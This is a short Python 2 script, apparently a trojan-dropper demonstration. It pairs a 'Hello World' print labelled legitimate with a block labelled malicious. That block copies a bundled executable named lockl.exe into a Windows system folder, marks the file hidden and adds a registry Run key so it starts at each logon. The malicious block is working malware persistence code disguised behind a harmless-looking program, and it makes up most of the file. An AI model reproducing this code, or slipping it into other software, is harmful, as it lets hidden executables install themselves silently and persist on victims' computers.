#################################################################################################
#START OF MALICIOUS CODE
################################################################################################
import _winreg as winreg
import shutil as su
import ctypes as ct
import os
import sys

def set_run_key(key, value):
    """
    Set/Remove Run Key in windows registry.

    :param key: Run Key Name
    :param value: Program to Run
    :return: None

    To remove a key, give a value of none
    """
    # This is for the system run variable
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)

    with reg_key:
        if value is None:
            winreg.DeleteValue(reg_key, key)
        else:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ
            else:
                var_type = winreg.REG_SZ
            winreg.SetValueEx(reg_key, key, 0, var_type, value)

su.copy2(sys._MEIPASS+'\\lockl.exe', 'C:\\ProgramData\\Microsoft\\Windows')

ct.windll.kernel32.SetFileAttributesW(u'C:\\ProgramData\\Microsoft\\Windows\\lockl.exe', 2)

set_run_key('lockl', 'C:\\ProgramData\\Microsoft\\Windows\\lockl.exe')
#################################################################################################
#END OF MALICIOUS CODE
#################################################################################################

#################################################################################################
#START OF LEGITIMATE CODE
################################################################################################
print "Hello World ??? ..."